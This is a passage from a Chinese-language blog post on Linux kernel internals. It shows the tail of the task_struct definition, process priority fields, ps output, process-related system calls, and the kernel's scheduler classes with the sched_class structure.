class="line"><span class="comment">	 *  - task&#x27;s runqueue locked, task not running</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">numa_group</span> __<span class="title">rcu</span>		*<span class="title">numa_group</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * numa_faults is an array split into four regions:</span></span><br><span class="line"><span class="comment">	 * faults_memory, faults_cpu, faults_memory_buffer, faults_cpu_buffer</span></span><br><span class="line"><span class="comment">	 * in this precise order.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * faults_memory: Exponential decaying average of faults on a per-node</span></span><br><span class="line"><span class="comment">	 * basis. Scheduling placement decisions are made based on these</span></span><br><span class="line"><span class="comment">	 * counts. The values remain static for the duration of a PTE scan.</span></span><br><span class="line"><span class="comment">	 * faults_cpu: Track the nodes the process was running on when a NUMA</span></span><br><span class="line"><span class="comment">	 * hinting fault was incurred.</span></span><br><span class="line"><span class="comment">	 * faults_memory_buffer and faults_cpu_buffer: Record faults per node</span></span><br><span class="line"><span class="comment">	 * during the current scan window. When the scan completes, the counts</span></span><br><span class="line"><span class="comment">	 * in faults_memory and faults_cpu decay and these values are copied.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			*numa_faults;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			total_numa_faults;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * numa_faults_locality tracks if faults recorded during the last</span></span><br><span class="line"><span class="comment">	 * scan window were remote/local or failed to migrate. The task scan</span></span><br><span class="line"><span class="comment">	 * period is adapted based on the locality of the faults with different</span></span><br><span class="line"><span class="comment">	 * weights depending on whether they were shared or private faults</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			numa_faults_locality[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			numa_pages_migrated;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA_BALANCING */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_RSEQ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rseq</span> __<span class="title">user</span> *<span class="title">rseq</span>;</span></span><br><span class="line">	u32 rseq_sig;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * RmW on rseq_event_mask must be performed atomically</span></span><br><span class="line"><span class="comment">	 * with respect to preemption.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> rseq_event_mask;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tlbflush_unmap_batch</span>	<span class="title">tlb_ubc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">refcount_t</span>		rcu_users;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Cache last used pipe for splice(): */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>		*<span class="title">splice_pipe</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page_frag</span>		<span class="title">task_frag</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TASK_DELAY_ACCT</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_delay_info</span>		*<span class="title">delays</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAULT_INJECTION</span></span><br><span class="line">	<span class="type">int</span>				make_it_fail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			fail_nth;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When (nr_dirtied &gt;= nr_dirtied_pause), it&#x27;s time to call</span></span><br><span class="line"><span class="comment">	 * balance_dirty_pages() for a dirty throttling pause:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span>				nr_dirtied;</span><br><span class="line">	<span class="type">int</span>				nr_dirtied_pause;</span><br><span class="line">	<span class="comment">/* Start of a write-and-pause period: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			dirty_paused_when;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LATENCYTOP</span></span><br><span class="line">	<span class="type">int</span>				latency_record_count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">latency_record</span>		<span class="title">latency_record</span>[<span class="title">LT_SAVECOUNT</span>];</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Time slack values; these are used to round up poll() and</span></span><br><span class="line"><span class="comment">	 * select() etc timeout values. These are in nanoseconds.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u64				timer_slack_ns;</span><br><span class="line">	u64				default_timer_slack_ns;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			kasan_depth;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FUNCTION_GRAPH_TRACER</span></span><br><span class="line">	<span class="comment">/* Index of current stored address in ret_stack: */</span></span><br><span class="line">	<span class="type">int</span>				curr_ret_stack;</span><br><span class="line">	<span class="type">int</span>				curr_ret_depth;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Stack of return addresses for return function tracing: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ret_stack</span>		*<span class="title">ret_stack</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Timestamp for last schedule: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>		ftrace_timestamp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of functions that haven&#x27;t been traced</span></span><br><span class="line"><span class="comment">	 * because of depth overrun:</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic_t</span>			trace_overrun;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Pause tracing: */</span></span><br><span class="line">	<span class="type">atomic_t</span>			tracing_graph_pause;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRACING</span></span><br><span class="line">	<span class="comment">/* State flags for use by tracers: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			trace;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Bitmask and counter of trace recursion: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			trace_recursion;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_TRACING */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KCOV</span></span><br><span class="line">	<span class="comment">/* See kernel/kcov.c for more details. */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Coverage collection mode enabled for this task (0 if disabled): */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			kcov_mode;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Size of the kcov_area: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			kcov_size;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Buffer for coverage collection: */</span></span><br><span class="line">	<span class="type">void</span>				*kcov_area;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* KCOV descriptor wired with this task or NULL: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kcov</span>			*<span class="title">kcov</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* KCOV common handle for remote coverage collection: */</span></span><br><span class="line">	u64				kcov_handle;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* KCOV sequence number: */</span></span><br><span class="line">	<span class="type">int</span>				kcov_sequence;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span>		*<span class="title">memcg_in_oom</span>;</span></span><br><span class="line">	<span class="type">gfp_t</span>				memcg_oom_gfp_mask;</span><br><span class="line">	<span class="type">int</span>				memcg_oom_order;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Number of pages to reclaim on returning to userland: */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			memcg_nr_pages_over_high;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Used by memcontrol for targeted memcg charge: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span>		*<span class="title">active_memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_BLK_CGROUP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">request_queue</span>		*<span class="title">throttle_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UPROBES</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">uprobe_task</span>		*<span class="title">utask</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_BCACHE) || defined(CONFIG_BCACHE_MODULE)</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			sequential_io;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>			sequential_io_avg;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ATOMIC_SLEEP</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			task_state_change;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span>				pagefault_disabled;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>		*<span class="title">oom_reaper_list</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_VMAP_STACK</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_struct</span>		*<span class="title">stack_vm_area</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_THREAD_INFO_IN_TASK</span></span><br><span class="line">	<span class="comment">/* A live task holds one reference: */</span></span><br><span class="line">	<span class="type">refcount_t</span>			stack_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_LIVEPATCH</span></span><br><span class="line">	<span class="type">int</span> patch_state;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="comment">/* Used by LSM modules for access restriction: */</span></span><br><span class="line">	<span class="type">void</span>				*security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_GCC_PLUGIN_STACKLEAK</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			lowest_stack;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>			prev_lowest_stack;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * New fields for task_struct should be added above here, so that</span></span><br><span class="line"><span class="comment">	 * they are included in the randomized portion of task_struct.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	randomized_struct_fields_end</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* CPU-specific state of this task: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span>		<span class="title">thread</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * WARNING: on x86, &#x27;thread_struct&#x27; contains a variable-sized</span></span><br><span class="line"><span class="comment">	 * structure.  It *MUST* be at the end of &#x27;task_struct&#x27;.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Do not put anything below here!</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h2><p>Linux 进程 分为 3 种类型 , “ 限期进程 “ , “ 实时进程 “ , “ 普通进程 “ ; 从 “ 进程优先级 “ 角度对比 , 优先级从高到低分别是 : 限期进程 &gt; 实时进程 &gt; 普通进程 ;</p>
<ul>
<li><strong>限期进程：</strong> 优先级为 -1</li>
<li><strong>实时进程：</strong>动态优先级为0-99的进程，采用实时调度算法调度。</li>
<li><strong>普通进程：</strong>动态优先级为100-139的进程，采用完全公平调度算法调度。</li>
<li><strong>nice值：</strong>是用于调整普通进程优先级的参数。范围：-20-19。</li>
</ul>
<p>一般来说优先级顺序，限期进程 &gt; 实时进程 &gt; 普通进程。</p>
<h3 id="查看进程优先级"><a href="#查看进程优先级" class="headerlink" title="查看进程优先级"></a>查看进程优先级</h3><p>执行 ps -elf 命令查看进程优先级，PRI：进程优先级，数值越小，优先级越高。（并非动态优先级）NI：nice值。</p>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">❯ ps -elf</span><br><span class="line">F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD</span><br><span class="line">4 S root           1       0  6  80   0 - 25316 -      15:12 ?        00:00:01 /sbin/init auto nopro</span><br><span class="line">1 S root           2       0  0  80   0 -     0 -      15:12 ?        00:00:00 [kthreadd]</span><br><span class="line">1 I root           3       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [rcu_gp]</span><br><span class="line">1 I root           4       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [rcu_par_gp]</span><br><span class="line">1 I root           5       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [slub_flushwq]</span><br><span class="line">1 I root           6       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [netns]</span><br><span class="line">1 I root           7       2  0  80   0 -     0 -      15:12 ?        00:00:00 [kworker/0:0-events]</span><br><span class="line">1 I root           8       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [kworker/0:0H-events_</span><br><span class="line">5 I root           9       2  0  80   0 -     0 -      15:12 ?        00:00:00 [kworker/0:1-events]</span><br><span class="line">5 I root          10       2  4  80   0 -     0 -      15:12 ?        00:00:01 [kworker/u256:0-event</span><br><span class="line">1 I root          11       2  0  60 -20 -     0 -      15:12 ?        00:00:00 [mm_percpu_wq]</span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>

<h3 id="进程优先级策略"><a href="#进程优先级策略" class="headerlink" title="进程优先级策略"></a>进程优先级策略</h3><ul>
<li><strong>prio</strong>（动态优先级）</li>
</ul>
<p>动态优先级，有效优先级，调度器最终使用的优先级数值，范围0-139，值越小，优先级越高。用于保存静态优先级, 是进程启动时分配的优先级, 可以通过nice和sched_setscheduler系统调用来进行修改, 否则在进程运行期间会一直保持恒定</p>
<ul>
<li><strong>static_prio</strong>（静态优先级）</li>
</ul>
<p>静态优先级，采用<code>SCHED_NORMAL</code>和<code>SCHED_BATCH</code>调度策略的进程（即普通进程）用于计算动态优先级的，范围100-139。进程的动态优先级, 这个有显示才是调度器重点考虑的进程优先级</p>
<p><code>prio = static_prio = nice + DEFAULT_PRIO = nice + 120</code>。</p>
<ul>
<li><strong>normal_prio</strong>（归一化优先级）</li>
</ul>
<p>用于计算prio的中间变量，不需要太关心。普通进程的静态优先级static_prio和调度策略计算出的优先级. 因此即使普通进程和实时进程具有相同的静态优先级, 其普通优先级也是不同的, 进程分叉(fork)时, 子进程会继承父进程的普通优先级, 可以通过normal_prio来计算(非实时进程用static_prIo计算, 实时进程用rt_priority计算)</p>
<ul>
<li><strong>rt_priority</strong>（实时优先级）</li>
</ul>
<p>实时优先级，采用<code>SCHED_FIFO</code>和<code>SCHED_RR</code>调度策略进程（即实时进程）用于计算动态优先级，范围0-99。实时优先级数值越大，得到的动态优先级数值越小，优先级越高。</p>
<p><code>prio = MAX_RT_PRIO - 1 - rt_prio = 100 - 1 - rt_priority</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/prio.jpg"
                      alt="prio"
                ></p>
<h2 id="一些进程相关系统调用"><a href="#一些进程相关系统调用" class="headerlink" title="一些进程相关系统调用"></a>一些进程相关系统调用</h2><p><code>fork(), vfork(), clone()</code> 函数实际上就是系统调用。</p>
<table>
<thead>
<tr>
<th align="left">调用</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">clone</td>
<td align="left">创建轻量级进程（也就是线程），pthread库基于此实现</td>
</tr>
<tr>
<td align="left">vfork</td>
<td align="left">父子进程共享资源，子进程先于父进程执行</td>
</tr>
<tr>
<td align="left">fork</td>
<td align="left">创建父进程的完整副本</td>
</tr>
</tbody></table>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/29/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E4%B9%8B%E8%BF%9B%E7%A8%8B/kernel_fork.png"
                      alt="kernel_fork"
                ></p>
<h2 id="退出进程"><a href="#退出进程" class="headerlink" title="退出进程"></a>退出进程</h2><p><strong>正常退出</strong></p>
<ul>
<li>从main函数返回return</li>
<li>调用exit</li>
<li>调用_exit</li>
</ul>
<p><strong>异常退出</strong></p>
<ul>
<li>调用abort</li>
<li>由信号终止</li>
</ul>
<h1 id="调度器简述"><a href="#调度器简述" class="headerlink" title="调度器简述"></a>调度器简述</h1><h2 id="调度器"><a href="#调度器" class="headerlink" title="调度器"></a>调度器</h2><ul>
<li>调度：就是按照某种调度的算法设计，从进程的就绪队列中选择进程分配CPU，主要是协调进程对CPU等相关资源的使用。</li>
<li>调度的目的：最大限度的使用CPU时间。</li>
</ul>
<p>​        Linux内核中用来安排调度进程执行的模块称为调度器（Scheduler），它可以切换进程状态（执行、睡眠、退出等）。调度器相当于CPU的管理员，主要完成两件事：</p>
<ol>
<li>选择某些就绪进程来执行</li>
<li>打断某些执行的进程让他们变为就绪态</li>
</ol>
<p>​        操作系统还负责“上下文切换”，即保存切换前的寄存器内容等进程的状态，以便稍后恢复。如果调度器支持就绪状态切换到执行状态，同时支持执行状态切换为就绪状态，就称该调度器为抢占式调度器。</p>
<h2 id="调度类结构体"><a href="#调度类结构体" class="headerlink" title="调度类结构体"></a>调度类结构体</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> &#123;</span></span><br><span class="line">    <span class="comment">/* OS中有多个调度类,按照调度优先级排成一个链表 */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_UCLAMP_TASK</span></span><br><span class="line">	<span class="type">int</span> uclamp_enabled;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* 将进程加入到执行队列中,即将调度实体存放到红黑树中，并将nr_running变量+1 */</span></span><br><span class="line">	<span class="type">void</span> (*enqueue_task) (<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">int</span> flags);</span><br><span class="line">    <span class="comment">/* 从执行队列删除进程,并将nr_running变量-1*/</span></span><br><span class="line">	<span class="type">void</span> (*dequeue_task) (<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">int</span> flags);</span><br><span class="line">    <span class="comment">/* 放弃CPU的执行权限，实际上此函数执行先出队后入队，这种情况下它直接将调度实体存放在红黑树的最右端 */</span></span><br><span class="line">	<span class="type">void</span> (*yield_task)   (<span class="keyword">struct</span> rq *rq);</span><br><span class="line">	<span class="type">bool</span> (*yield_to_task)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">bool</span> preempt);</span><br><span class="line">	<span class="comment">/* 专门用于检查当前进程是否可被新进程抢占 */</span></span><br><span class="line">	<span class="type">void</span> (*check_preempt_curr)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">int</span> flags);</span><br><span class="line">	<span class="comment">/* 选择下一个要运行的进程 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *(*<span class="title">pick_next_task</span>)(<span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>);</span></span><br><span class="line">	<span class="comment">/* 将进程加到运行队列中 */</span></span><br><span class="line">	<span class="type">void</span> (*put_prev_task)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p);</span><br><span class="line">	<span class="type">void</span> (*set_next_task)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">bool</span> first);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">	<span class="type">int</span> (*balance)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *prev, <span class="keyword">struct</span> rq_flags *rf);</span><br><span class="line">	<span class="type">int</span>  (*select_task_rq)(<span class="keyword">struct</span> task_struct *p, <span class="type">int</span> task_cpu, <span class="type">int</span> sd_flag, <span class="type">int</span> flags);</span><br><span class="line">	<span class="type">void</span> (*migrate_task_rq)(<span class="keyword">struct</span> task_struct *p, <span class="type">int</span> new_cpu);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> (*task_woken)(<span class="keyword">struct</span> rq *this_rq, <span class="keyword">struct</span> task_struct *task);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> (*set_cpus_allowed)(<span class="keyword">struct</span> task_struct *p,</span><br><span class="line">				 <span class="type">const</span> <span class="keyword">struct</span> cpumask *newmask);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> (*rq_online)(<span class="keyword">struct</span> rq *rq);</span><br><span class="line">	<span class="type">void</span> (*rq_offline)(<span class="keyword">struct</span> rq *rq);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> (*task_tick)(<span class="keyword">struct</span> rq *rq, <span class="keyword">struct</span> task_struct *p, <span class="type">int</span> queued);</span><br><span class="line">	<span class="type">void</span> (*task_fork)(<span class="keyword">struct</span> task_struct *p);</span><br><span class="line">	<span class="type">void</span> (*task_dead)(<span class="keyword">struct</span> task_struct *p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The switched_from() call is allowed to drop rq-&gt;lock, therefore we</span></span><br><span class="line"><span class="comment">	 * cannot assume the switched_from/switched_to pair is serliazed by</span></span><br><span class="line"><span class="comment">	 * rq-&gt;lock. They are however serialized by p-&gt;pi_lock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">void</span> (*switched_from)(<span class="keyword">struct</span> rq *this_rq, <span class="keyword">struct</span> task_struct *task);</span><br><span class="line">	<span class="type">void</span> (*switched_to)  (<span class="keyword">struct</span> rq *this_rq, <span class="keyword">struct</span> task_struct *task);</span><br><span class="line">	<span class="type">void</span> (*prio_changed) (<span class="keyword">struct</span> rq *this_rq, <span class="keyword">struct</span> task_struct *task,</span><br><span class="line">			      <span class="type">int</span> oldprio);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*get_rr_interval)</span><span class="params">(<span class="keyword">struct</span> rq *rq,</span></span><br><span class="line"><span class="params">					<span class="keyword">struct</span> task_struct *task)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> (*update_curr)(<span class="keyword">struct</span> rq *rq);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_SET_GROUP		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TASK_MOVE_GROUP		1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FAIR_GROUP_SCHED</span></span><br><span class="line">	<span class="type">void</span> (*task_change_group)(<span class="keyword">struct</span> task_struct *p, <span class="type">int</span> type);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="调度器分类"><a href="#调度器分类" class="headerlink" title="调度器分类"></a>调度器分类</h2><p>调度器可分为五种，对应不同的调度策略：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">stop_sched_class</span>;</span> <span class="comment">// 停机调度类</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">dl_sched_class</span>;</span>   <span class="comment">// 期限调度类 </span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">rt_sched_class</span>;</span>   <span class="comment">// 实时调度类</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">fair_sched_class</span>;</span> <span class="comment">// 公平调度类/cfs</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> <span class="title">idle_sched_class</span>;</span> <span class="comment">// 空闲调度类</span></span><br></pre></td></tr></table></figure></div>

<p>这五种调度类优先级从高到低依次为：停机调度类&gt;限期调度类&gt;实时调度类&gt;公平调度类&gt;空闲调度类</p>
<ul>
<li><strong>停机调度类</strong></li>
</ul>
<p>​        优先级最高的调度类，停机进程是优先级最高的进程，可以抢占所有其他进程，其他进程不可能抢占停机进程，停机的意思是使处理器停下来，做更紧急的事情。</p>
<ul>
<li><strong>限期调度类</strong></li>
</ul>
<p>​        最早使用优先算法。使用红黑树把进程按照绝对截止限期从小到达排序，每次调度时选择绝对截止期限最小的进程。如果限期进程用完了它的运行时间，它将让出处理器，并且把它从运行队列中删除。在下一个周期开始，重新把它添加到运行队列中。</p>
<ul>
<li><strong>实时调度类</strong></li>
</ul>
<p>​        为每个调度优先级维护一个队列。SCHED_FIFO实现了一种简单的、先进先出的调度算法。它不使用时间片。处于可运行状态的SCHED_FIFO级的进程会比任何SCHED_NORMAL级的进程都先得到调度。一旦一个SCHED_FIFO级进程处于可运行状态，就会一直执行，直到它自己受阻塞或显式地释放处理器为止。 它不基于时间片，可以一直执行下去。只有更高优先级的SCHED_FIFO或者SCHED_RR任务才能抢占SCHED_FIFO任务。如果有两个或者更多的同优先级的SCHED_FIFO级进程，它们会轮流执行，但是依然只有在它们愿意让出处理器时才会退出。只有有SCHED_FIFO级进程在执行，其他级别较低的进程就只能等待它变为不可运行后才有机会执行。</p>
<ul>
<li><strong>实时调度类</strong></li>
</ul>
<p>​          SCHED_RR与SCHED_FIFO大体相同，只是SCHED_RR级的进程在耗尽事先分配给它的时间后就不能再继续执行了。也就是说，SCHED_RR是带有时间片的SCHED_FIFO——这是一种实时轮流调度算法。                  </p>
<ul>
<li><strong>公平调度类</strong></li>
</ul>
<p>​        使用完全公平调度算法。完全公平调度算法引入虚拟运行时间的相关概念：虚拟运行时间 &#x3D; 实际运行时间 * nice0对应的权重 &#x2F; 进程的权重</p>
<ul>
<li><strong>空闲调度类</strong></li>
</ul>
<p>​        每个CPU上都有一个空闲线程，即0号线程，空闲调度类优先级别最低，当没有其他进程可以调度的时候，才会调度空闲线程。</p>
